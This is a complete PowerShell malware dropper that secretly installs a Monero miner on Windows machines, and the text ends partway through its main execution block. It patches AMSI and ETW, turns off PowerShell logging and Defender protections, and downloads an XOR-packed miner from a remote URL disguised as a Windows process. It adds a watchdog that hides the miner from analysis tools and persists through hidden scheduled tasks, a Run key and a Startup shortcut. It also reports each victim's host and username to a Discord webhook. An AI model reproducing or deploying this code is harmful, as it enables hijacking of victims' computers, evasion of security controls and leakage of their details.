$ErrorActionPreference = "SilentlyContinue"
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

try {
    $asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
    $type = $asm.GetType('System.Management.Automation.AmsiUtils')
    $field = $type.GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    $field.SetValue($null, $true)
} catch {}
try {
    $scanBuffer = $asm.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    if ($scanBuffer) {
        $scanPtr = $scanBuffer.MethodHandle.GetFunctionPointer()
        $oldProtect = [UInt32]0
        $VP = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);' -Name "Kernel32" -Namespace "Win32" -PassThru
        $VP::VirtualProtect($scanPtr, [UInt32]32, [UInt32]0x40, [ref]$oldProtect) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, $scanPtr, 1)
    }
} catch {}
try {
    $etwType = $asm.GetType('System.Management.Automation.PSEtwLogProvider')
    $etwField = $etwType.GetField('etwProvider', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    $etwField.SetValue($null, $null)
} catch {}
$slPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
if (!(Test-Path $slPath)) { New-Item -Path $slPath -Force | Out-Null }
Set-ItemProperty -Path $slPath -Name "EnableScriptBlockLogging" -Value 0 -Type DWord
$mlPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
if (!(Test-Path $mlPath)) { New-Item -Path $mlPath -Force | Out-Null }
Set-ItemProperty -Path $mlPath -Name "EnableModuleLogging" -Value 0 -Type DWord
Write-Host "[+] AMSI + ETW + Logging bypassed" -ForegroundColor Green

function Encrypt-Bytes {
    param([byte[]]$Data, [byte[]]$Key, [byte[]]$IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key; $aes.IV = $IV; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $enc = $aes.CreateEncryptor()
    $result = $enc.TransformFinalBlock($Data, 0, $Data.Length)
    $aes.Dispose()
    return $result
}

function Decrypt-Bytes {
    param([byte[]]$Data, [byte[]]$Key, [byte[]]$IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key; $aes.IV = $IV; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec = $aes.CreateDecryptor()
    $result = $dec.TransformFinalBlock($Data, 0, $Data.Length)
    $aes.Dispose()
    return $result
}

function Protect-String {
    param([string]$PlainText)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $encrypted = Encrypt-Bytes -Data $bytes -Key $encKey -IV $encIV
    return [Convert]::ToBase64String($encrypted)
}

function Unprotect-String {
    param([string]$CipherBase64)
    $bytes = [Convert]::FromBase64String($CipherBase64)
    $decrypted = Decrypt-Bytes -Data $bytes -Key $encKey -IV $encIV
    return [System.Text.Encoding]::UTF8.GetString($decrypted)
}

$keyHash = (Get-FileHash "$env:SYSTEMROOT\System32\user32.dll" -Algorithm SHA256).Hash
$ivHash = (Get-FileHash "$env:SYSTEMROOT\System32\gdi32.dll" -Algorithm SHA256).Hash
$encKey = [System.Text.Encoding]::UTF8.GetBytes($keyHash[0..31] -join '')[0..31]
$encIV = [System.Text.Encoding]::UTF8.GetBytes($ivHash[0..15] -join '')[0..15]
Write-Host "[+] Encryption ready" -ForegroundColor Green

$rootDir = "$env:ProgramData\Microsoft\Windows\NetworkService"
$installDir = "$rootDir\cache"
$backupDir = "$rootDir\backup"
$logDir = "$rootDir\logs"
$tempDir = "$env:Temp\~$D1F4A2"
$minerExe = "$installDir\SearchProtocolHost.exe"
$configFile = "$installDir\mssearch.dat"
$selfHealPs1 = "$installDir\SearchProtocolHost.ps1"
$watchdogVbs = "$installDir\SearchProtocolHost.vbs"
$worker = $env:COMPUTERNAME
$wallet = "467g1meizFe31GzFMG7xoy3yxThG56p7NNzutKff7YPi1DadAdrkY2xLj9zLWjZNm4hfXoF2uxa6PgJCWQc6QUh64NGpXEL"
$pool = "pool.hashvault.pro:443"
$poolBak = "pool.supportxmr.com:443"
$xorKey = [byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
$encBinUrl = "https://raw.githubusercontent.com/maroz123/Football/main/xmrig_enc.bin"
$taskBase = "Microsoft\Windows\NetworkService"
$taskName = "$taskBase\ProtocolHostMaintenance"
$wdTask = "$taskBase\FilterHostRestart"
$watchdogLog = "$logDir\watchdog.log"
Write-Host "[+] Paths configured" -ForegroundColor Green

function Invoke-DefenseEvasion {
    $defenderBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    $rtBase = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    @($defenderBase, $rtBase) | ForEach-Object {
        if (!(Test-Path $_)) { New-Item -Path $_ -Force | Out-Null }
    }
    Set-ItemProperty -Path $defenderBase -Name "DisableAntiSpyware" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableScriptScanning" -Value 1 -Type DWord
    Set-ItemProperty -Path $rtBase -Name "DisableIOAVProtection" -Value 1 -Type DWord
    try {
        Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $rootDir -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "SearchProtocolHost.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "SearchFilterHost.exe" -ErrorAction SilentlyContinue
    } catch {}
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 2 -Type DWord -ErrorAction SilentlyContinue
    Write-Host "[+] Defender evasion applied" -ForegroundColor Green
}

function Install-Miner {
    @($installDir, $backupDir, $tempDir, $logDir) | ForEach-Object {
        if (!(Test-Path $_)) { New-Item -ItemType Directory -Path $_ -Force | Out-Null }
    }
    Get-Process | Where-Object { $_.Path -like "*NetworkService*SearchProtocolHost*" } | ForEach-Object {
        taskkill /F /PID $($_.Id) /T 2>$null
    }
    Start-Sleep -Seconds 2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Write-Host "[+] Downloading packed miner..." -ForegroundColor Yellow
    $downloaded = $false
    $encFile = "$tempDir\mscache.dat"
    for ($attempt = 1; $attempt -le 3; $attempt++) {
        try {
            $versions = @("10.0", "10.0.19041", "10.0.22000", "10.0.22621")
            $winVer = $versions | Get-Random
            $chromeMajor = Get-Random -Minimum 90 -Maximum 121
            $chromeBuild = Get-Random -Minimum 4000 -Maximum 5800
            $ua = "Mozilla/5.0 (Windows NT $winVer; Win64; x64) AppleWebKit/537.$chromeBuild (KHTML, like Gecko) Chrome/$chromeMajor.0.0.0 Safari/537.$chromeBuild"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", $ua)
            $wc.DownloadFile($encBinUrl, $encFile)
            if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break }
        } catch {}
        if (-not $downloaded) {
            try {
                Invoke-WebRequest -Uri $encBinUrl -OutFile $encFile -UserAgent $ua -UseBasicParsing -ErrorAction Stop
                if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break }
            } catch {}
        }
        if (-not $downloaded) {
            try {
                Start-BitsTransfer -Source $encBinUrl -Destination $encFile -ErrorAction Stop
                if ((Test-Path $encFile) -and (Get-Item $encFile).Length -gt 1MB) { $downloaded = $true; break }
            } catch {}
        }
        if (!$downloaded -and $attempt -lt 3) { Start-Sleep -Seconds 5 }
    }
    if (-not $downloaded) { throw "Download failed" }
    Write-Host "[+] Decrypting packed miner..." -ForegroundColor Yellow
    $encBytes = [IO.File]::ReadAllBytes($encFile)
    for ($i = 0; $i -lt $encBytes.Length; $i++) { $encBytes[$i] = $encBytes[$i] -bxor $xorKey[$i % $xorKey.Length] }
    [IO.File]::WriteAllBytes($minerExe, $encBytes)
    cmd /c "del /f /q `"$encFile`"" 2>$null
    if (!(Test-Path $minerExe) -or (Get-Item $minerExe).Length -lt 1MB) { throw "Miner decrypt failed" }
    Write-Host "[+] Packed miner installed" -ForegroundColor Green
}

function Write-MinerConfig {
    $q = [char]34
    $cfg = "{${q}autosave${q}:false,${q}cpu${q}:{${q}max-threads-hint${q}:10,${q}priority${q}:2,${q}huge-pages${q}:true,${q}huge-pages-jit${q}:true,${q}asm${q}:true,${q}yield${q}:false,${q}memory-pool${q}:true},${q}opencl${q}:false,${q}cuda${q}:false,${q}pools${q}:[{${q}url${q}:${q}stratum+ssl://$pool${q},${q}user${q}:${q}$wallet${q},${q}pass${q}:${q}$worker${q},${q}keepalive${q}:true,${q}tls${q}:true},{${q}url${q}:${q}stratum+ssl://$poolBak${q},${q}user${q}:${q}$wallet${q},${q}pass${q}:${q}$worker${q},${q}keepalive${q}:true,${q}tls${q}:true}],${q}donate-level${q}:0,${q}background${q}:true,${q}colors${q}:false,${q}print-time${q}:0,${q}randomx${q}:{${q}1gb-pages${q}:true,${q}wrmsr${q}:true,${q}numa${q}:true,${q}init${q}:-1,${q}mode${q}:${q}auto${q},${q}cache_qos${q}:true}}"
    Set-Content -Path $configFile -Value $cfg -Force
    $meta = "POOL_PRIMARY=$(Protect-String $pool)`nPOOL_BACKUP=$(Protect-String $poolBak)`nWALLET=$(Protect-String $wallet)`nWORKER=$worker`nINSTALLED=$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Set-Content -Path "$installDir\mssearch.idx" -Value $meta -Force
    Write-Host "[+] Config written" -ForegroundColor Green
}

function Write-StealthWatchdog {
    $watchdogBat = "$installDir\SearchFilterHost.bat"
    $bat = @"
@echo off
setlocal EnableDelayedExpansion

set MONITOR_LIST=taskmgr.exe procexp.exe procexp64.exe ProcessHacker.exe SystemInformer.exe procmon.exe procmon64.exe wireshark.exe x64dbg.exe x32dbg.exe ollydbg.exe ida.exe ida64.exe ghidra.exe dumpcap.exe CheatEngine.exe dnSpy.exe de4dot.exe dotPeek.exe Harmony.exe reflexil.exe dbgview.exe tcpview.exe autoruns.exe strings.exe PE-bear.exe pestudio.exe
set WAS_HIDDEN=0
set RESTART_COUNT=0
set MAX_RESTARTS=20
set LOG_FILE=$logDir\watchdog.log
set MINER_DIR=$installDir
set MINER_EXE=$minerExe
set MINER_CFG=$configFile
set XOR_KEY=4D 79 53 65 63 72 65 74 4B 65 79 31 32 33 34 35
set ENC_URL=$encBinUrl

if not exist "$logDir" mkdir "$logDir"

:loop
timeout /t 3 /nobreak >nul

set ANY_OPEN=0
for %%M in (%MONITOR_LIST%) do (
    tasklist /fi "imagename eq %%M" 2>nul | find /i "%%M" >nul
    if !errorlevel!==0 set ANY_OPEN=1
)

set MINER_RUNNING=0
tasklist /fi "imagename eq SearchProtocolHost.exe" 2>nul | find /i "SearchProtocolHost" >nul
if !errorlevel!==0 set MINER_RUNNING=1

if !ANY_OPEN==1 (
    if !MINER_RUNNING==1 (
        taskkill /f /im SearchProtocolHost.exe >nul 2>&1
        set WAS_HIDDEN=1
        set RESTART_COUNT=0
        echo %date% %time% [HIDDEN] Monitoring tool detected, miner killed >> "%LOG_FILE%"
        goto loop
    )
)

if !ANY_OPEN==0 (
    if !MINER_RUNNING==0 (
        if !WAS_HIDDEN==1 (
            set WAS_HIDDEN=0
            if !RESTART_COUNT! LSS !MAX_RESTARTS! (
                if exist "%MINER_EXE%" (
                    set /a RESTART_COUNT+=1
                    start "" /min "%MINER_EXE%" --config="%MINER_CFG%"
                    echo %date% %time% [RESTART] Watchdog restarting miner ^(#%RESTART_COUNT%^) >> "%LOG_FILE%"
                    timeout /t 5 /nobreak >nul
                    goto loop
                ) else (
                    goto restore
                )
            ) else (
                echo %date% %time% [LIMIT] Max restarts reached ^(%MAX_RESTARTS%^), waiting for next boot >> "%LOG_FILE%"
                goto loop
            )
        )
    )
)

if !ANY_OPEN==0 (
    if !MINER_RUNNING==0 (
        if exist "%MINER_EXE%" (
            set /a RESTART_COUNT+=1
            if !RESTART_COUNT! LSS !MAX_RESTARTS! (
                start "" /min "%MINER_EXE%" --config="%MINER_CFG%"
                echo %date% %time% [CRASH] Miner crashed, restarting ^(#%RESTART_COUNT%^) >> "%LOG_FILE%"
                timeout /t 5 /nobreak >nul
            ) else (
                echo %date% %time% [LIMIT] Max restarts reached ^(%MAX_RESTARTS%^), waiting for next boot >> "%LOG_FILE%"
                set RESTART_COUNT=0
            )
        ) else (
            goto restore
        )
    )
)

goto loop

:restore
echo %date% %time% [RESTORE] Miner exe missing, restoring from backup >> "%LOG_FILE%"
set BACKUP=$backupDir
if exist "%BACKUP%\SearchProtocolHost.exe" (
    copy /y "%BACKUP%\SearchProtocolHost.exe" "%MINER_EXE%" >nul
    copy /y "%BACKUP%\mssearch.dat" "%MINER_CFG%" >nul
    set /a RESTART_COUNT+=1
    start "" /min "%MINER_EXE%" --config="%MINER_CFG%"
    echo %date% %time% [RESTORE] Restored from backup >> "%LOG_FILE%"
    timeout /t 5 /nobreak >nul
    goto loop
)
goto download_fresh

:download_fresh
echo %date% %time% [DOWNLOAD] No backup found, downloading packed miner >> "%LOG_FILE%"
set ENC_FILE=%TEMP%\~mscache.dat
bitsadmin /transfer minerDl /download /priority high "%ENC_URL%" "%ENC_FILE%" >nul 2>&1
if not exist "%ENC_FILE%" (
    powershell.exe -WindowStyle Hidden -Command "$wc=New-Object System.Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$wc.DownloadFile('%ENC_URL%','%ENC_FILE%')"
)
if not exist "%ENC_FILE%" (
    echo %date% %time% [FAIL] Download failed >> "%LOG_FILE%"
    set RESTART_COUNT=0
    goto loop
)
powershell.exe -WindowStyle Hidden -Command "$k=[byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35);$b=[IO.File]::ReadAllBytes('%ENC_FILE%');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k[$i % $k.Length]};[IO.File]::WriteAllBytes('%MINER_EXE%',$b)"
del /f /q "%ENC_FILE%" >nul 2>&1
if exist "%MINER_EXE%" (
    set /a RESTART_COUNT+=1
    start "" /min "%MINER_EXE%" --config="%MINER_CFG%"
    echo %date% %time% [DOWNLOAD] Fresh packed install complete >> "%LOG_FILE%"
    timeout /t 5 /nobreak >nul
) else (
    echo %date% %time% [FAIL] Decrypt failed >> "%LOG_FILE%"
)
goto loop
"@
    Set-Content -Path $watchdogBat -Value $bat -Force
    $vbsCode = "Set objShell = CreateObject(`"WScript.Shell`")`nobjShell.Run `"cmd.exe /c `"`"$watchdogBat`"`"`", 0, False"
    Set-Content -Path $watchdogVbs -Value $vbsCode -Force
    Write-Host "[+] Stealth watchdog created" -ForegroundColor Green
}

function Write-SelfHealScript {
    $healCode = @"
`$ErrorActionPreference = "SilentlyContinue"
try {
    `$asm = [System.Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
    `$type = `$asm.GetType('System.Management.Automation.AmsiUtils')
    `$field = `$type.GetField('amsiInitFailed', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    `$field.SetValue(`$null, `$true)
} catch {}
try {
    `$scanBuffer = `$asm.GetType('System.Management.Automation.AmsiUtils').GetMethod('AmsiScanBuffer', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    if (`$scanBuffer) {
        `$scanPtr = `$scanBuffer.MethodHandle.GetFunctionPointer()
        `$oldProtect = [UInt32]0
        `$VP = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);' -Name "Kernel32" -Namespace "Win32" -PassThru
        `$VP::VirtualProtect(`$scanPtr, [UInt32]32, [UInt32]0x40, [ref]`$oldProtect) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xC3), 0, `$scanPtr, 1)
    }
} catch {}
try {
    `$etwType = `$asm.GetType('System.Management.Automation.PSEtwLogProvider')
    `$etwField = `$etwType.GetField('etwProvider', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
    `$etwField.SetValue(`$null, `$null)
} catch {}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
`$root = "$rootDir"
`$minerPath = "$minerExe"
`$configPath = "$configFile"
`$backupPath = "$backupDir"
`$xorKey = [byte[]](0x4D,0x79,0x53,0x65,0x63,0x72,0x65,0x74,0x4B,0x65,0x79,0x31,0x32,0x33,0x34,0x35)
`$encUrl = "$encBinUrl"
`$running = Get-Process -Name "SearchProtocolHost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -like "*NetworkService*" }
if (`$running) { exit 0 }
if ((Test-Path "`$backupPath\SearchProtocolHost.exe") -and (Test-Path "`$backupPath\mssearch.dat")) {
    if (!(Test-Path "`$root\cache")) { New-Item -ItemType Directory -Path "`$root\cache" -Force | Out-Null }
    Copy-Item "`$backupPath\SearchProtocolHost.exe" `$minerPath -Force
    Copy-Item "`$backupPath\mssearch.dat" `$configPath -Force
    Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`"`$configPath`"`"" -WindowStyle Hidden -PassThru | Out-Null
    exit 0
}
try {
    `$encFile = "`$env:Temp\~mscache.dat"
    `$wc = New-Object System.Net.WebClient
    `$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    `$wc.DownloadFile(`$encUrl, `$encFile)
    if (!(Test-Path `$encFile) -or (Get-Item `$encFile).Length -lt 1MB) {
        Start-BitsTransfer -Source `$encUrl -Destination `$encFile -ErrorAction Stop
    }
    if (Test-Path `$encFile) {
        `$encBytes = [IO.File]::ReadAllBytes(`$encFile)
        for (`$i = 0; `$i -lt `$encBytes.Length; `$i++) { `$encBytes[`$i] = `$encBytes[`$i] -bxor `$xorKey[`$i % `$xorKey.Length] }
        if (!(Test-Path "`$root\cache")) { New-Item -ItemType Directory -Path "`$root\cache" -Force | Out-Null }
        [IO.File]::WriteAllBytes(`$minerPath, `$encBytes)
        Set-Content -Path `$configPath -Value '{\"autosave\":false,\"cpu\":{\"max-threads-hint\":10,\"priority\":2,\"huge-pages\":true},\"opencl\":false,\"cuda\":false,\"pools\":[{\"url\":\"stratum+ssl://pool.hashvault.pro:443\",\"user\":\"467g1meizFe31GzFMG7xoy3yxThG56p7NNzutKff7YPi1DadAdrkY2xLj9zLWjZNm4hfXoF2uxa6PgJCWQc6QUh64NGpXEL\",\"pass\":\"' + `$env:COMPUTERNAME + '\",\"keepalive\":true,\"tls\":true}],\"donate-level\":0,\"background\":true,\"randomx\":{\"1gb-pages\":true,\"wrmsr\":true,\"numa\":true}}' -Force
        Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`"`$configPath`"`"" -WindowStyle Hidden -PassThru | Out-Null
        Remove-Item `$encFile -Force -ErrorAction SilentlyContinue
    }
} catch {}
"@
    Set-Content -Path $selfHealPs1 -Value $healCode -Force
    Write-Host "[+] Self-heal script written" -ForegroundColor Green
}

function Set-Persistence {
    $taskXml = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></LogonTrigger><BootTrigger><Enabled>true</Enabled><Delay>PT60S</Delay></BootTrigger><SessionStateChangeTrigger><Enabled>true</Enabled><StateChange>SessionUnlock</StateChange></SessionStateChangeTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + $selfHealPs1 + '"</Arguments></Exec></Actions></Task>'
    $xmlFile = "$tempDir\task.xml"
    Set-Content -Path $xmlFile -Value $taskXml -Encoding Unicode
    & schtasks /create /tn $taskName /xml "$xmlFile" /f 2>$null
    Remove-Item "$xmlFile" -Force -ErrorAction SilentlyContinue
    $wdXml = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><LogonTrigger><Enabled>true</Enabled><Delay>PT15S</Delay></LogonTrigger><BootTrigger><Enabled>true</Enabled><Delay>PT45S</Delay></BootTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>"' + $watchdogVbs + '"</Command></Exec></Actions></Task>'
    $wdXmlFile = "$tempDir\wdtask.xml"
    Set-Content -Path $wdXmlFile -Value $wdXml -Encoding Unicode
    & schtasks /create /tn $wdTask /xml "$wdXmlFile" /f 2>$null
    Remove-Item "$wdXmlFile" -Force -ErrorAction SilentlyContinue
    $regValName = [System.BitConverter]::ToString((Get-FileHash "$env:SYSTEMROOT\System32\ntoskrnl.exe" -Algorithm MD5).Hash[0..3]) -replace '-',''
    & reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $regValName /t REG_SZ /d "wscript.exe `"`"$watchdogVbs`"`"" /f 2>$null
    $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $ws = New-Object -ComObject WScript.Shell
    $sc = $ws.CreateShortcut("$startupDir\SearchIndexer.lnk")
    $sc.TargetPath = "wscript.exe"
    $sc.Arguments = "`"`"$watchdogVbs`"`""
    $sc.WindowStyle = 7
    $sc.Description = "Windows Search Indexer Service"
    $sc.Save()
    & attrib +h "$startupDir\SearchIndexer.lnk" 2>$null
    Write-Host "[+] Persistence set" -ForegroundColor Green
}

function Set-DeepPersistence {
    $deepXml = '<?xml version="1.0" encoding="UTF-16"?><Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"><Triggers><BootTrigger><Enabled>true</Enabled><Delay>PT30S</Delay></BootTrigger><LogonTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></LogonTrigger></Triggers><Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden></Settings><Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $selfHealPs1 + '"</Arguments></Exec></Actions></Task>'
    $deepXmlFile = "$tempDir\deep_persist.xml"
    Set-Content -Path $deepXmlFile -Value $deepXml -Encoding Unicode
    & schtasks /create /tn "WindowsServiceDeepPersist" /xml "$deepXmlFile" /f 2>$null
    Remove-Item "$deepXmlFile" -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Deep persistence created" -ForegroundColor Green
}

function Enable-HugePages {
    try {
        $ntdll = Add-Type -MemberDefinition '[DllImport("ntdll.dll")] public static extern int NtSetInformationProcess(IntPtr h, int p, ref uint t, int s);' -Name "Ntdll" -Namespace "Win32" -PassThru
        $handle = [System.Diagnostics.Process]::GetCurrentProcess().Handle
        $privilege = [uint32]4
        $ntdll::NtSetInformationProcess($handle, 29, [ref]$privilege, 4) | Out-Null
        Write-Host "[+] Huge Pages enabled" -ForegroundColor Green
    } catch {
        Write-Host "[!] Huge Pages fallback: $_" -ForegroundColor Yellow
    }
}

function Disable-Sleep {
    $powerBase = "HKLM:\SYSTEM\CurrentControlSet\Control\Power"
    Set-ItemProperty -Path $powerBase -Name "HibernateEnabled" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    Write-Host "[+] Sleep disabled" -ForegroundColor Green
}

function Start-RandomDelay {
    param([int]$Min = 2, [int]$Max = 10)
    Start-Sleep -Seconds (Get-Random -Minimum $Min -Maximum $Max)
}

function Lock-InstallDirectory {
    & icacls $installDir /inheritance:r /T /Q 2>$null
    & icacls $installDir /grant:r "*S-1-5-18:(OI)(CI)F" /T /Q 2>$null
    $userSid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
    & icacls $installDir /grant:r "*$($userSid):(OI)(CI)F" /T /Q 2>$null
    & attrib +h +s $installDir /s /d 2>$null
    & attrib +h +s "$installDir\*" /s /d 2>$null
    Write-Host "[+] Directory locked" -ForegroundColor Green
}

function Backup-MinerFiles {
    if (!(Test-Path $backupDir)) { New-Item -ItemType Directory -Path $backupDir -Force | Out-Null }
    $backupMap = @(
        @{ Source = $minerExe; Dest = "$backupDir\SearchProtocolHost.exe" },
        @{ Source = $configFile; Dest = "$backupDir\mssearch.dat" },
        @{ Source = $selfHealPs1; Dest = "$backupDir\SearchProtocolHost.ps1" }
    )
    foreach ($item in $backupMap) {
        if (Test-Path $item.Source) {
            for ($i = 1; $i -le 3; $i++) {
                Copy-Item -Path $item.Source -Destination $item.Dest -Force -ErrorAction SilentlyContinue
                $srcHash = (Get-FileHash $item.Source -Algorithm SHA256).Hash
                $dstHash = (Get-FileHash $item.Dest -Algorithm SHA256).Hash
                if ($srcHash -eq $dstHash) { break }
            }
        }
    }
    & attrib +h +s $backupDir /s /d 2>$null
    Write-Host "[+] Backup created" -ForegroundColor Green
}

function Send-DiscordWebhook {
    param([bool]$Success = $true, [string]$ErrorMsg = "")
    $webhookUrl = "https://discord.com/api/webhooks/1550937962173169804/H-WL-mcPYjAnDH2rhxy2uMWl8SIdncytNI1cnXHZNEpij6bR6cCaO3EhDulq31KBJ6QT"
    $osName = "Unknown"
    try { $osName = (Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption } catch {}
    $statusField = if ($Success) { "Success" } else { "Failed: $ErrorMsg" }
    $color = if ($Success) { 3447003 } else { 16711680 }
    $payload = @{username="SOINION";embeds=@(@{title="Miner Deployed (v7.5.5 PACKED)";color=$color;fields=@(@{name="Host";value="$env:COMPUTERNAME";inline=$true},@{name="User";value="$env:USERNAME";inline=$true},@{name="OS";value=$osName;inline=$false},@{name="Status";value=$statusField;inline=$false},@{name="Stealth";value="Packed binary, XOR encrypted, no stock xmrig on disk";inline=$false});footer=@{text="deploy_client.ps1 v7.5.5 PACKED"};timestamp=(Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")})} | ConvertTo-Json -Depth 5
    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Content-Type", "application/json")
        $webClient.UploadString($webhookUrl, "POST", $payload) | Out-Null
    } catch { Write-Host "[!] Webhook failed: $_" -ForegroundColor Red }
}

$deploymentSuccess = $false
$deploymentError = ""
try {
    Write-Host "`n[!] deploy_client.ps1 v7.5.5 - PACKED EDITION" -ForegroundColor Cyan
    Invoke-DefenseEvasion
    Start-RandomDelay -Min 3 -Max 8
    Disable-Sleep
    Start-RandomDelay -Min 2 -Max 5
    Enable-HugePages
    Start-RandomDelay -Min 2 -Max 5
    Install-Miner
    if (-not (Test-Path $minerExe)) { throw "Miner file missing" }
    Start-RandomDelay -Min 3 -Max 8
    Write-MinerConfig
    if (-not (Test-Path $configFile)) { throw "Config file missing" }
    Start-RandomDelay -Min 2 -Max 5
    Write-StealthWatchdog
    Write-SelfHealScript
    Start-RandomDelay -Min 2 -Max 5
    Set-Persistence
    Start-RandomDelay -Min 3 -Max 8
    Set-DeepPersistence
    Start-RandomDelay -Min 2 -Max 5
